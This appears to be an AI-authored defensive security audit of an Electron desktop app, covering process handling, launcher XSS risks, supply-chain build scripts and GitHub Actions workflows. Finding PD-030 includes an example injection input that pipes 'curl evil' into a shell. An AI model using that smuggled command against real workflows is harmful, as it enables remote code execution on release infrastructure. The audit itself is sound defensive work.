# Paperclip Desktop — Code Audit (living document)

Started: 2026-06-11 · Auditor: Claude Code (defensive quality/security audit)
Codebase version: 3.2.9 (master, clean tree)

## Scope & exclusions

Audited: all first-party source under `src/`, `scripts/`, `test/`, `.github/workflows/`,
`electron-builder.yml`, `build/*.plist`, `package.json`/`tsconfig.json`.

Excluded (with reason):
- `node_modules/`, `dist/`, `release/`, `build/server-bundle/`, `build/node-bin/` — third-party deps and build artifacts, not first-party source.
- `build/icon.png`, `build/icon.ico` — binary assets.
- `docs/` — prose, mockups, PRDs; read for context, not auditable code.
- `.claude/` — agent skill definitions, not shipped code.
- `pnpm-lock.yaml` — generated; reviewed only at the level of `pnpm.overrides` in package.json.
- `.github/workflows.disabled/` — disabled workflows, not executable; skimmed for dormant risk only.
- `LICENSE`, `README.md` — prose.

## Scan log / coverage checklist

Status: pending → in progress → done

### Batch 1 — Electron main process & IPC surface
- [x] src/main.ts — done (findings PD-001…PD-008)
- [x] src/runtime-safety.ts — done (no findings; path env handling is defensive and sound)
- [x] src/navigation-gestures.ts — done (no findings; pure history navigation with capability checks)
- [x] src/preload.ts — done (no findings; minimal contextBridge surface — note PD-009)
- [x] src/splash-preload.ts — done (no findings; status-listener only)
- [x] src/launcher-preload.ts — done (no findings in the bridge itself; its capability surface is why PD-010 matters)

### Batch 2 — Connection handling & updater
- [x] src/connection/types.ts — done (no findings; pure types/constants)
- [x] src/connection/validate.ts — done (PD-043, PD-044; core normalization sound — protocol allowlist, userinfo rejection, WHATWG normalization defeats IDN/decimal-IP tricks)
- [x] src/connection/preflight.ts — done (PD-040, PD-041, PD-049)
- [x] src/connection/profiles.ts — done (PD-042, PD-045, PD-046, PD-050, PD-051; field-by-field sanitization defeats prototype pollution)
- [x] src/connection/local-server-lifecycle.ts — done (no findings; note: PID-value equality has a theoretical reuse window — object-identity compare would be strictly safer)
- [x] src/connection/local-server-health.ts — done (shares PD-040's body-timeout gap, low risk against the locally spawned server)
- [x] src/connection/window-policy.ts — done (no findings — exact `.origin` equality, opaque origins fail closed; verified correct)
- [x] src/updater.ts — done (PD-047, PD-048; check/download promise concurrency handled correctly)

### Batch 3 — Launcher UI
- [x] src/launcher-html.ts — done (findings PD-010…PD-014; full read lines 1–2218)

### Batch 4 — Build & release scripts
- [x] scripts/prepare-server.mjs — done (PD-015, PD-016, PD-017, PD-023, PD-027)
- [x] scripts/build-ui.mjs — done (PD-018, PD-019, PD-023)
- [x] scripts/dev.mjs — done (no findings; spawn without shell, constant paths)
- [x] scripts/after-pack.mjs — done (PD-021, PD-023; fail-closed unsigned gate and correct inside-out signing order noted as positives)
- [x] scripts/after-sign.mjs — done (PD-022)
- [x] scripts/stage-after-pack.mjs — done (PD-021, PD-023)
- [x] scripts/release-macos-local.mjs — done (PD-020, PD-025, PD-026; mkdtemp staging avoids TOCTOU)
- [x] scripts/prepare-macos-release-assets.mjs — done (PD-028, PD-026)
- [x] scripts/publish-macos-release-assets.mjs — done (PD-029; gh via arg arrays, strong draft protections)
- [x] scripts/notarize-prebuilt-macos.mjs — done (PD-024, PD-026)
- [x] scripts/repackage-prebuilt-macos.mjs — done (PD-025)
- [x] scripts/smoke-test-packaged-macos.mjs — done (no security findings; nit: unvalidated `--timeout-ms` parseInt → NaN → immediate timeout)
- [x] scripts/verify-macos-release.mjs — done (PD-021, PD-024)

### Batch 5 — CI, packaging config, tests
- [x] .github/workflows/release.yml — done (PD-030, PD-031, PD-034, PD-035, PD-036)
- [x] .github/workflows/notarize-submit.yml — done (PD-030 worst instance, PD-031, PD-037)
- [x] .github/workflows/notarize-status.yml — done (PD-030, PD-031)
- [x] electron-builder.yml — done (no findings; tight `files` glob, publish scoped to own repo; nit: duplicate `@aws-*` extraResources entries subsumed by the node_modules glob)
- [x] build/entitlements.mac.plist — done (PD-032)
- [x] build/entitlements.mac.inherit.plist — done (PD-032; tighter than electron-builder default — no dyld-env entitlement)
- [x] package.json (deps/overrides) — done (no findings; lodash 4.18.1 override verified legitimate — see "Ruled out")
- [x] tsconfig.json — done (PD-038)
- [x] test/connection-validate.test.mjs — done (no findings)
- [x] test/connection-preflight.test.mjs — done (PD-039: no 3xx-response case)
- [x] test/connection-profiles.test.mjs — done (no findings)
- [x] test/window-policy.test.mjs — done (PD-039: thinnest coverage on riskiest module)
- [x] test/navigation-gestures.test.mjs — done (no findings)
- [x] test/local-server-lifecycle.test.mjs — done (no findings)
- [x] test/local-server-health.test.mjs — done (no findings)
- [x] test/runtime-safety.test.mjs — done (no findings; best file in the suite)
- [x] test/prepare-macos-release-assets.test.mjs — done (PD-039: missing-arch case uncovered)

### Also reviewed
- [x] .github/workflows.disabled/ — skimmed (dormant; PD-033)

## Findings

Method note: each batch was scanned by a dedicated review pass; every High/Critical
finding and each batch's key claims were then independently re-verified by reading
the cited lines directly before being recorded here.

---

### Batch 1 — Electron main process & IPC

#### PD-001 — No single-instance lock: a second app instance kills the first instance's live server
- **Severity:** High · **Confidence:** high (verified)
- **Where:** `src/main.ts:300-314` (`killOrphanedServer`), app startup (`app.whenReady`); no `requestSingleInstanceLock` anywhere in `src/` (grep-verified)
- **Problem:** On startup, `killOrphanedServer()` reads the shared PID file and `treeKill`s whatever PID it finds if alive. There is no `app.requestSingleInstanceLock()`. Launching the app a second time (`open -n`, Finder race, dev terminal) makes instance #2 SIGTERM instance #1's healthy server mid-use; the two instances then fight over the PID file and potentially the same Postgres data dir.
- **Fix:**
  ```ts
  if (!app.requestSingleInstanceLock()) {
    app.quit();
  } else {
    app.on("second-instance", () => { mainWindow?.show(); mainWindow?.focus(); });
    // existing whenReady flow; only treat the PID file as orphaned when the lock is held
  }
  ```
- **How I found this:** While auditing `killOrphanedServer` for PID races, asked "what guarantees the PID is actually orphaned?" — nothing but liveness. Grepped all of `src/` for `requestSingleInstanceLock`/`second-instance` to rule out the lock living elsewhere (absent), and confirmed both instances compute the same `getPidFilePath()` (same userData dir).

#### PD-002 — Stale-PID kill: PID file trusted blindly, can SIGTERM an unrelated process tree
- **Severity:** Medium · **Confidence:** high (verified)
- **Where:** `src/main.ts:300-314`, esp. 302–306
- **Problem:** After a crash + reboot or PID rollover, the recorded PID can belong to an unrelated process. `process.kill(pid, 0)` only checks existence; then `treeKill(pid, "SIGTERM")` kills that process and all children. TOCTOU window between probe and kill; PID file content is trusted on-disk state (anything that writes to userData picks the victim); `parseInt("1234garbage")` → 1234 also passes.
- **Fix:** Persist `{pid, processStartTime, exePath}` and verify identity before killing (e.g. `ps -o lstart=,comm= -p <pid>` matches the bundled node binary and recorded start time). Require `/^\d+$/.test(pidStr)`.
- **How I found this:** Direct read of `killOrphanedServer`; confirmed the only validation is parseInt + signal-0. Ruled out shell injection via tree-kill (pid passed as argv element, numeric).

#### PD-003 — Port-selection TOCTOU + unauthenticated localhost trust: window can load a rogue local server
- **Severity:** Medium · **Confidence:** high (race verified; exploitation needs a local attacker)
- **Where:** `src/main.ts:146-164` (`isPortInUse`/`findFreePort`), `166-188` (`waitForPort`), `bootLocal` (~925–1031)
- **Problem:** (1) The free port is found by probing, then the server is spawned — another local process can bind it in between. (2) `waitForPort` only confirms *something* accepts TCP on 127.0.0.1:port, not that it's our child — if the server fails to bind, boot "succeeds" against a squatter. (3) The window then loads `http://localhost:{port}` with `preload.js` attached, non-sandboxed, and a persistent local partition (cookies/localStorage from real sessions readable by whatever is serving). No token/auth handshake exists anywhere.
- **Fix:** Authenticate the child: have the server emit a one-time token (env-provided, echoed on a health endpoint, or written 0600 to userData) and verify it before `loadURL`. Prefer reading the actually-bound port from the child's stdout over pre-selecting one.
- **How I found this:** Traced `findFreePort` → `startServer(PORT env)` → `waitForPort` → `loadURL`. Confirmed `waitForPort` (lines 176–179) resolves on bare TCP connect with zero identity check and that no token/auth exists for the loaded origin.

#### PD-004 — Login-shell PATH probe executes shell rc files and trusts the resulting PATH
- **Severity:** Medium · **Confidence:** high (verified)
- **Where:** `src/main.ts:235-278` (`resolveShellPath`), result injected into the server child's `PATH` (335–341, 348–354)
- **Problem:** `execSync(\`${userShell} -lc 'echo $PATH'\`)` — `-l` sources `~/.zprofile`/`~/.zshrc` etc., so app launch executes arbitrary user shell startup code, and dotfile-level tampering steers which binaries the long-lived server (which spawns Postgres and tools) later resolves. `userShell` comes from `$SHELL` and is interpolated into a shell string (interpreter choice + quoting hazard), though no user *data* is interpolated.
- **Fix:** Use `spawnSync(userShell, ["-lc", "echo $PATH"])` (argv array, no interpolation), validate `$SHELL` against `/etc/shells`, and sanitize returned entries (drop relative and world-writable dirs) — or skip the login shell and rely on the existing `fallbackDirs` allowlist.
- **How I found this:** Flagged by the "shell PATH probing" risk lens; read `resolveShellPath`, confirmed `execSync` string interpolation of `$SHELL` and the flow of the result into the child env. Rated Medium (trust/rc-execution), not Critical, since no untrusted data is interpolated.

#### PD-005 — `killServer()` has no timeout or SIGKILL escalation; quit can hang with the server orphaned
- **Severity:** Low · **Confidence:** medium (code verified; hang requires treeKill to stall)
- **Where:** `src/main.ts:369-386` (`killServer`), `before-quit` handler (~1593–1607)
- **Problem:** `killServer` resolves only in `treeKill`'s callback; the callback's error argument is ignored and there is no timeout. If a child ignores SIGTERM or treeKill errors, `before-quit` (which already `preventDefault()`ed) never reaches `app.quit()`, and the detached server survives as an orphan.
- **Fix:** Race against a timeout, escalate to `treeKill(pid, "SIGKILL")` after ~5s, check the callback error, and `app.exit(0)` if the graceful path stalls.
- **How I found this:** Followed the shutdown path from `before-quit` into `killServer`; noted the promise is gated entirely on the callback with the error arg discarded, and `detached: !isWindows` in `startServer` confirms orphan potential.

#### PD-006 — Shutdown paths not idempotent: signal handlers and `before-quit` can both run `killServer()`
- **Severity:** Low · **Confidence:** medium
- **Where:** `src/main.ts` (~1593–1614)
- **Problem:** SIGTERM/SIGINT/SIGHUP handlers and `before-quit` each call `killServer()`. Today the second call is benign only because `serverProcess` is nulled early (line 379) — safe by accident, dependent on ordering.
- **Fix:** Single shared shutdown promise: first caller creates it, everyone else awaits it.
- **How I found this:** Read both shutdown registrations together and traced `isQuitting`/`serverProcess = null` timing.

#### PD-007 — `bootLocal` reuse fast-path requires a live window; can double-spawn servers (possible)
- **Severity:** Low · **Confidence:** possible (needs runtime confirmation)
- **Where:** `src/main.ts` (~903–932)
- **Problem:** The "already local, just refocus" shortcut requires `mainWindow && !isDestroyed()`. With a live `serverProcess` but the window closed (macOS), `bootLocal` falls through and spawns a second server on a fresh port; during the boot window two Postgres-backed servers may run against the same `PAPERCLIP_HOME`. The supersede-kill lifecycle logic likely converges afterward, hence "possible".
- **Fix:** Short-circuit when `serverProcess` is alive and healthy regardless of window state; recreate the window via `reopenCurrentConnectionWindow` instead of re-spawning.
- **How I found this:** Traced `bootLocal` guards vs `startServer`; the existence of `reopenCurrentConnectionWindow` for exactly the window-gone case is the tell. To confirm: close the local window on macOS, retrigger `bootLocal`, watch for two server processes.

#### PD-008 — `isPortInUse` has no connect timeout; a stalling port hangs `findFreePort`
- **Severity:** Low · **Confidence:** high (verified)
- **Where:** `src/main.ts:146-154`
- **Problem:** A port that accepts SYN but never completes the handshake leaves the promise pending forever; startup stalls with no error.
- **Fix:** `sock.setTimeout(500, () => { sock.destroy(); resolve(false); });` and `sock.destroy()` in the error handler.
- **How I found this:** Read the helper while assessing PD-003; no `setTimeout` present.

#### PD-009 — `preload.ts` allows unbounded `onStatus` listener accumulation
- **Severity:** Low · **Confidence:** high
- **Where:** `src/preload.ts` (9 lines)
- **Problem:** Each `onStatus` call adds an `ipcRenderer.on` listener with no removal path — repeated registration leaks listeners. Not a security issue; the bridge surface itself is minimal and correct.
- **Fix:** Return an unsubscribe function (`ipcRenderer.removeListener`) or `removeAllListeners("update-status")` before re-adding.
- **How I found this:** Full read of the preload during the IPC-surface pass.

---

### Batch 3 — Launcher UI (`src/launcher-html.ts`)

#### PD-010 — Stale verification result can be applied to a different URL (verify-then-connect bypass)
- **Severity:** Medium · **Confidence:** high (verified)
- **Where:** `src/launcher-html.ts:1333-1370` (`verifyRemote`), 1372–1439 (`continueToSignIn`/`connectAndSave`), 2193–2197 (input listener)
- **Problem:** `verifyRemote()` sets the global `lastVerification = result` unconditionally after its `await` (line 1355), and its `finally` re-enables the Connect buttons whenever `lastVerification.ok`. The connect handlers read the URL fresh from the input but only gate on `lastVerification.ok` — never that it matches the current URL. Sequence: verify URL A (in flight) → edit field to URL B (reset runs, buttons disable) → A's result lands, re-enabling buttons → Connect now connects to B under A's verification, including A's `insecureTransport` decision (HTTP-ack bypass).
- **Fix:** Token-guard in-flight verifies and record the verified URL:
  ```js
  let verifyToken = 0;
  async function verifyRemote() {
    const remoteUrl = ...; const token = ++verifyToken;
    ...
    const result = await launcher.verifyRemote({ remoteUrl });
    if (token !== verifyToken) return;     // superseded by an edit/new verify
    result.verifiedUrl = remoteUrl;
    lastVerification = result;
    ...
  }
  // in connect handlers:
  if (!lastVerification?.ok || lastVerification.verifiedUrl !== remoteUrl) { /* require re-verify */ }
  ```
- **How I found this:** Traced every consumer of `lastVerification`; noticed the post-`await` assignment with no staleness guard while the input listener (the only thing nulling it) runs synchronously at edit time, so an in-flight result clobbers the reset. Confirmed the main process trusts the renderer's verify-gate/insecure-ack decision.

#### PD-011 — Profile `id` interpolated into `onclick` attributes with JS-string escaping only (stored-XSS shape)
- **Severity:** Low · **Confidence:** high (code verified; exploitation requires a tampered on-disk profile store)
- **Where:** `src/launcher-html.ts:1258, 1265` (`renderTabRemoteList`), ~1552–1560 (`renderConnections`); helper `escapeJsSingleQuote` 1963–1965; origin `src/connection/profiles.ts:318` (`id: raw.id` — no UUID-shape validation)
- **Problem:** `onclick="quickConnect('" + escapeJsSingleQuote(p.id) + "')"` — the helper escapes only `\` and `'`, but the value sits inside a double-quoted HTML attribute subject to entity decoding. A `"` in `p.id` breaks out of the attribute and injects arbitrary handlers — script execution in the launcher window, which holds the full `paperclipLauncher` IPC capability surface. Ids are normally `randomUUID()`, but the disk-load sanitizer passes any string through, and the profile store JSON is exactly the "loaded from disk" untrusted surface.
- **Fix:** Stop using inline handlers — `dataset.id` + `addEventListener` (id never enters HTML parsing). Minimal: `escapeHtml(escapeJsSingleQuote(p.id))` at every attribute site. Defense-in-depth: validate `raw.id` against a UUID regex in `sanitizeRemoteProfile` (drop/regenerate otherwise) and add a strict CSP `<meta>` to the launcher HTML (`default-src 'none'; script-src 'self'; style-src 'unsafe-inline'`-equivalent as needed).
- **How I found this:** Classified every `innerHTML` interpolation as escaped/raw; `p.id` was the only attacker-influenceable value escaped solely by `escapeJsSingleQuote` (read the helper — no `"`/`&`/`<` handling). Traced `id` to `profiles.ts` and confirmed no format check on load. Confirmed `name`/`remoteUrl` are safe (escapeHtml in text position or `textContent` only).

#### PD-012 — Unescaped class-name interpolation in `innerHTML` (currently safe; latent)
- **Severity:** Low · **Confidence:** high (currently safe — defensive)
- **Where:** `src/launcher-html.ts:1264, 1308, ~1567` (`statusClass(p)`, `mapped.badgeClass`)
- **Problem:** Values injected into `class="..."` without escaping. Both currently come from closed switch/map literals so are not attacker-controlled — but there is no escaping in the way if either ever returns a server-derived string.
- **Fix:** Wrap in `escapeHtml(...)` or build elements and use `classList`.
- **How I found this:** Same sink classification pass; followed both producers to their definitions to confirm closed value sets.

#### PD-013 — Click-handler functions dereference `snapshot` without null guards
- **Severity:** Low · **Confidence:** medium
- **Where:** `src/launcher-html.ts:1585` (`openEditModal`), 1643 (`deleteConn`), 1677 (`quickConnect`)
- **Problem:** `snapshot.profiles.find(...)` with no null check. Normally invoked only after a snapshot rendered, but a main-process `launcher:navigate` arriving before `bootstrap()` completes would throw `Cannot read properties of null`.
- **Fix:** `if (!snapshot) return;` at the top of each (and `duplicateConn`).
- **How I found this:** Searched every `snapshot.` dereference for a preceding guard; the render functions guard, the click handlers don't. Medium confidence because a pre-bootstrap navigate couldn't be proven from this file alone.

#### PD-014 — No double-submit guard on connect actions
- **Severity:** Low · **Confidence:** medium
- **Where:** `src/launcher-html.ts:1270-1277` (`launchLocal`), 1372–1439, 1676–1706 (`quickConnect`)
- **Problem:** Connect paths fire IPC without disabling their trigger or setting an in-progress flag before the first `await`; rapid double-clicks/Enter repeats double-fire (duplicate connect attempts / profile saves). The verify button does this correctly via `syncRemoteActionButtons(true)` — the connect paths lack the equivalent.
- **Fix:** Module-level `let connecting = false;` set before the first await; short-circuit re-entry; reset on error/navigation.
- **How I found this:** Reviewed each `launcher.connect*` call site for re-entry protection, using the verify button's existing guard as the expected pattern.

---

### Batch 4 — Build & release scripts (supply chain)

#### PD-015 — Bundled Node.js binary downloaded with no checksum/signature verification
- **Severity:** High · **Confidence:** high (verified)
- **Where:** `scripts/prepare-server.mjs:246-268` (esp. 254, 256)
- **Problem:** The Node runtime that ships inside every release is fetched with `curl -fsSL` / `Invoke-WebRequest` from nodejs.org and used as-is. No verification against the GPG-signed `SHASUMS256.txt`. HTTPS protects transit, but CDN compromise, a corporate MITM root CA, or content substitution flows straight into the signed, notarized app.
- **Fix:** Pin per-platform SHA-256s next to `NODE_VERSION` and verify before extraction:
  ```js
  const actual = createHash("sha256").update(readFileSync(archivePath)).digest("hex");
  if (actual !== NODE_SHA256[`${nodeDownloadPlatform}-${arch}`]) throw new Error(`Node archive checksum mismatch: ${actual}`);
  ```
- **How I found this:** Download-integrity lens on the download block; confirmed HTTPS, then searched the file for any `sha`/`checksum`/`gpg`/size validation after the curl — none; archive is extracted and deleted unverified.

#### PD-016 — Node binary cache key omits the version: bumping `NODE_VERSION` silently ships the old Node
- **Severity:** High · **Confidence:** high (verified)
- **Where:** `scripts/prepare-server.mjs:236-242`
- **Problem:** Cache path is `build/node-bin/<platform>-<arch>/node` (no version) and the skip check is bare `existsSync(destBin)`. Bumping `NODE_VERSION` (e.g. for a security patch) keeps shipping the old binary while logging "Node v22.15.0 … already downloaded". Also compounds PD-015: a tampered binary placed once is reused forever.
- **Fix:** Version the cache dir (`build/node-bin/${NODE_VERSION}/…`) or verify the cached binary (`node --version` match, with a checksum-marker fallback for cross-arch), deleting on mismatch.
- **How I found this:** Traced what the cache key consists of — `NODE_VERSION` appears only in the URL and log strings; confirmed nothing cleans `build/node-bin` on version change.

#### PD-017 — Shipped server bundle installed with no lockfile and lifecycle scripts enabled
- **Severity:** High · **Confidence:** high (verified)
- **Where:** `scripts/prepare-server.mjs:166-195`
- **Problem:** The install whose output ships in the app runs `npm install --production` in a freshly synthesized staging dir: (a) no lockfile/`npm ci` — the entire transitive tree resolves to "latest matching at build time", so identical desktop versions can ship different trees and a freshly-poisoned transitive release is picked up with zero review; (b) no `--ignore-scripts` — every postinstall in the tree executes on the build machine *and* its output ships. The repo already uses `--ignore-scripts` in `release-macos-local.mjs:407` — the protection exists, just not at the most critical install.
- **Fix:** Commit a reviewed staging lockfile per server version (`npm install --package-lock-only` once), install with `npm ci --omit=dev --ignore-scripts`, then explicitly rebuild the few packages that genuinely need scripts (`npm rebuild <pkg>` allowlist — likely `@embedded-postgres`/`esbuild` platform packages).
- **How I found this:** Compared flags across all npm-install sites in the 13 scripts; this one writes its package.json from scratch each run (provably never a lockfile) and lacks `--ignore-scripts`. Confirmed the output ships by following `bundleServerDir` into the staged release flow.

#### PD-018 — Shipped UI built from a mutable upstream git tag with no commit pinning
- **Severity:** High · **Confidence:** high (verified)
- **Where:** `scripts/build-ui.mjs:96-130` (clone at 107–110, `pnpm install` 127, build 130)
- **Problem:** The UI ships from a clone of `paperclipai/paperclip` at tag `v${serverVersion}`. Tags are mutable: a force-moved tag (upstream account/token compromise) is silently built and shipped — and its lifecycle scripts/build tooling execute on the machine holding your signing credentials. No `rev-parse HEAD` check exists. `--frozen-lockfile` only pins deps relative to the attacker-controlled clone.
- **Fix:** Record the expected commit SHA alongside the server version (package.json field or small manifest, updated as one reviewed diff per bump) and verify after clone:
  ```js
  const head = execFileSync("git", ["rev-parse", "HEAD"], { cwd: cloneDir, encoding: "utf8" }).trim();
  if (head !== EXPECTED_UPSTREAM_COMMIT) throw new Error(`Upstream tag resolved to unexpected commit ${head}`);
  ```
- **How I found this:** Git-integrity lens on the clone loop; the only post-clone check is "did the clone succeed". Confirmed `ui/dist` is copied into all server bundles.

#### PD-019 — Future `@paperclipai/ui` npm publication silently switches the shipped-UI source
- **Severity:** Medium · **Confidence:** medium
- **Where:** `scripts/build-ui.mjs:58-92`
- **Problem:** By design, the moment any `@paperclipai/ui@<serverVersion>` exists on npm, builds silently stop using the audited clone-and-build path and ship the npm tarball's `dist/` (`process.exit(0)` at line 84 makes the substitution total) — no provenance check, no announcement. If npm-scope control ever diverges from repo control, this is a quiet substitution channel. The tarball is also extracted with system `tar` rather than npm's sanitized extraction (modern tars refuse `..` by default — hence Medium).
- **Fix:** Gate the npm path behind an explicit env flag (`PAPERCLIP_UI_FROM_NPM=1`) or remove it until the package exists; when enabling, verify `npm view … dist.integrity` sha512 and extract via `pacote`.
- **How I found this:** Read the future-proofing block; the silent total switch (early exit before the clone path) is the tell. Medium because the npm scope appears controlled by the same upstream today.

#### PD-020 — Staged runtime install: transitive deps unpinned, and the resolved lockfile is deleted
- **Severity:** Medium · **Confidence:** high
- **Where:** `scripts/release-macos-local.mjs:260-280, 405-416` (lock deleted at 415)
- **Problem:** The stage install correctly uses `--ignore-scripts --omit=dev` and pins top-level versions from local `node_modules`, but transitives still resolve fresh from the registry at package time — what ships can differ from what was tested. The generated `package-lock.json` is then deleted, destroying the only record of the shipped tree.
- **Fix:** Minimum: copy the lockfile into the arch output dir next to `verification-summary.json` as an audit artifact. Better: pre-generate a reviewed lockfile and use `npm ci`.
- **How I found this:** Compared the three install sites; the explicit `rmSync(package-lock.json)` stood out as destroying audit evidence.

#### PD-021 — Missing `app-server` bundle tolerated end-to-end: a gutted app can pass verification
- **Severity:** Medium · **Confidence:** medium (each skip verified; end-to-end scenario reasoned)
- **Where:** `scripts/after-pack.mjs:165-168`, `scripts/stage-after-pack.mjs:208-210`, `scripts/verify-macos-release.mjs:172-176` (+ skip at ~252–255)
- **Problem:** If `Contents/Resources/app-server` is absent, after-pack logs "skipping", stage-after-pack returns silently, and the verifier returns `null` from `verifyServerRuntimeDependencies` — skipping the dylib/UI/migration checks entirely. A packaging mistake can produce a signed, notarized, "verified" app with no embedded server. Internal contradiction: `stage-after-pack.mjs` line 208 returns silently while its own `copyServerNodeModules` throws on the same class of absence.
- **Fix:** Make the bundle mandatory in the verifier (`throw` when `server/package.json` is missing) and turn the stage-after-pack early return into an error.
- **How I found this:** "Could we ship a partial artifact?" lens — traced the missing-bundle failure mode through all three layers expecting at least one hard failure; all three degrade to skip.

#### PD-022 — Notarization gate is fail-open (opt-in via env var) while the signing gate is fail-closed
- **Severity:** Medium · **Confidence:** medium
- **Where:** `scripts/after-sign.mjs:25-37`
- **Problem:** Notarization is only *required* when `PAPERCLIP_REQUIRE_MACOS_RELEASE_SIGNING === "1"`; with credentials absent and the flag unset, the build completes and produces DMG/ZIPs Gatekeeper will reject. Asymmetric with `after-pack.mjs`'s `ALLOW_UNSIGNED_MACOS_BUILD` gate, which fails closed. Nothing in CI pins the flag on (grep-verified).
- **Fix:** Invert the default: throw when notary credentials are missing unless `ALLOW_UNNOTARIZED_MACOS_BUILD=true` is explicitly set, mirroring the after-pack pattern.
- **How I found this:** Compared the two gates side by side; the fail-open/fail-closed asymmetry is the finding.

#### PD-023 — `sh -c` with interpolated paths in cleanup helpers (injection-shaped; inputs currently safe)
- **Severity:** Low · **Confidence:** high (pattern) / possible (exploitability)
- **Where:** `scripts/after-pack.mjs:116, 119`; `scripts/stage-after-pack.mjs:67-68`; same shape in `scripts/prepare-server.mjs:254-264` (curl/tar/powershell) and `scripts/build-ui.mjs:61, 72, 108` (`serverVersion`/tag into `execSync`)
- **Problem:** Paths/versions interpolated into shell strings. Today all inputs are constants or repo-rooted paths (the product name's space is quoted), but a checkout path containing `"`, `$(`, or backticks would execute arbitrary shell. `serverVersion` comes from your own committed package.json — same Low rating.
- **Fix:** Drop the shell: `execFileSync("find", [appPath, "-name", "._*", "-delete"])`, `execFileSync("git", ["clone", "--depth", "1", "--branch", tag, REPO_URL, cloneDir])`, etc.
- **How I found this:** Enumerated every child-process call in all 13 scripts and classified by shell exposure; everything else already uses argv arrays (codesign, notarytool, gh, ditto — all clean).

#### PD-024 — Release verifier's identity/team checks are optional; without env vars any valid signature passes
- **Severity:** Low · **Confidence:** medium
- **Where:** `scripts/verify-macos-release.mjs:8-9, 74-80`; caller gap `scripts/notarize-prebuilt-macos.mjs:148-154`
- **Problem:** `APPLE_CODESIGN_IDENTITY`/`APPLE_TEAM_ID` checks are skipped when unset, so a run without them asserts only "consistently signed by someone". The local release flow forwards identity; the notarize-prebuilt flow does not (it leans on `--require-stapled`, which mostly compensates — hence Low).
- **Fix:** Refuse weak verification: throw when neither expected identity/team nor `--require-stapled` is in effect.
- **How I found this:** Audited what each "verify" step actually proves and walked both call sites of the verifier.

#### PD-025 — `electronVersion` derived by stripping the semver range: packaged Electron can differ from the tested one
- **Severity:** Low · **Confidence:** high
- **Where:** `scripts/release-macos-local.mjs:342`; `scripts/repackage-prebuilt-macos.mjs:84`
- **Problem:** `"^41.5.0".replace(/^[^\d]*/, "")` → packages exactly 41.5.0, while the locally installed (developed/smoke-tested) Electron may be any newer 41.x from the lockfile. You can ship an Electron you never ran; security patches don't reach artifacts until the range floor is bumped.
- **Fix:** Read `node_modules/electron/package.json` `.version` instead.
- **How I found this:** The range-strip idiom only makes sense if the field can be a range — checked package.json, it's a caret range, so the mismatch is real.

#### PD-026 — Operator-supplied output paths feed `rmSync(recursive)` with no containment check
- **Severity:** Low · **Confidence:** possible (operator-error foot-gun, not attacker-driven)
- **Where:** `scripts/release-macos-local.mjs:476, 536` (`--output-root`); `scripts/prepare-macos-release-assets.mjs:266-268` (`--output-dir`); `scripts/notarize-prebuilt-macos.mjs:157-158, 173`
- **Problem:** `resolve(projectRoot, userArg)` honors absolute paths, so a typo'd or empty-evaluating CI variable (e.g. `--output-root /Users/aronprins`) becomes the target of a recursive forced delete.
- **Fix:** Require the resolved path to start with `projectRoot + sep` unless `--allow-external-output` is passed.
- **How I found this:** Enumerated every `rmSync(recursive)` and classified each path's provenance; only the CLI-arg ones lack containment.

#### PD-027 — Finder-duplicate heuristic can delete legitimate bundle files
- **Severity:** Low · **Confidence:** possible
- **Where:** `scripts/prepare-server.mjs:75-114` (regex at ~99)
- **Problem:** Any non-symlink file whose basename ends in space + digits (`chart 2.png`, `step 1.md`) is deleted from the shipped bundle — no check that a de-numbered sibling exists.
- **Fix:** Only treat as duplicate when `dirname/file<without " N">` actually exists; keep the loud warning.
- **How I found this:** Applied the unsafe-deletion lens to the bundle contents, not just filesystem roots; the purely name-based regex with no sibling check is the tell.

#### PD-028 — Hand-rolled YAML parser/serializer for `latest-mac.yml`, the auto-update integrity root
- **Severity:** Low · **Confidence:** medium
- **Where:** `scripts/prepare-macos-release-assets.mjs:51-169`
- **Problem:** `latest-mac.yml` carries the sha512 values electron-updater uses to verify downloads. The custom parser handles only the exact shape electron-builder currently emits (breaks on quoted colons, multiline values, comments; coerces all-digit strings to Number). A mis-parse either fails the release or emits a subtly wrong manifest. Mitigating: the existing URL-uniqueness/version-parity checks are good. Bonus gap: the script copies artifacts but never recomputes their sha512 against the manifest claims.
- **Fix:** Use `js-yaml` (already in node_modules via electron-builder), and recompute each file's sha512 during the copy, failing on mismatch — turning the script into a true integrity check.
- **How I found this:** Read the parser against electron-builder's actual output format and probed edge cases; noticed the missed recompute win while tracing the copy loop.

#### PD-029 — `getRelease` conflates "release not found" with any `gh` failure
- **Severity:** Low · **Confidence:** possible
- **Where:** `scripts/publish-macos-release-assets.mjs:79-85`
- **Problem:** `allowFailure: true` returns null for expired tokens/network blips too; the script then tries `gh release create`, bypassing the (well-designed) draft-protection checks in that error path — saved only by `gh` refusing existing tags.
- **Fix:** Distinguish via stderr (`/release not found|Not Found/i`) and throw on anything else.
- **How I found this:** Audited the draft-protection logic's key safety property (never clobber a published release) and probed its error paths.

---

### Batch 5 — CI, packaging config, tests

#### PD-030 — `workflow_dispatch` inputs interpolated directly into `run:` shell blocks (script injection)
- **Severity:** Medium · **Confidence:** high (verified by grep)
- **Where:** `.github/workflows/release.yml:233` (`tag="${{ github.event.inputs.ref }}"`); `.github/workflows/notarize-submit.yml:60` (input → `GITHUB_ENV`); `.github/workflows/notarize-status.yml:70-71` (submission-id inputs into a shell function call)
- **Problem:** `${{ }}` expands before the shell runs — an input like `v1.0.0"; curl evil | sh; echo "` executes arbitrary commands. notarize-submit:60 is worst: a newline-containing input injects arbitrary env vars into subsequent steps of a job holding Apple notarization credentials. Requires write access to dispatch, but these jobs run in the `release` environment with signing secrets — a low-trust collaborator compromise becomes a signing-pipeline compromise.
- **Fix:** Pass inputs through step `env:` (injection-safe assignment) and reference `"$INPUT_REF"` in the script; for notarize-submit, set `NOTARIZE_TAG` via step `env:` instead of `GITHUB_ENV`, and/or validate `[[ "$INPUT_TAG" =~ ^v[0-9][0-9A-Za-z.+-]*$ ]]`.
- **How I found this:** Grepped every `run:` block for `${{`; ruled out expression-context uses (concurrency group, artifact names, `with:` params) which aren't shell-evaluated.

#### PD-031 — Actions pinned by mutable tag, not commit SHA (incl. third-party `pnpm/action-setup`)
- **Severity:** Medium · **Confidence:** high
- **Where:** all `uses:` lines across the three active workflows (e.g. release.yml:38–206, notarize-submit.yml:114, notarize-status.yml:88)
- **Problem:** `pnpm/action-setup@v4` is third-party, tag-pinned, and runs before signing steps in jobs holding Apple certs — a compromised tag push executes attacker code on the signing runner. `actions/*` are lower risk but the same logic applies.
- **Fix:** Pin to full SHAs with version comments; enable Dependabot `github-actions` updates.
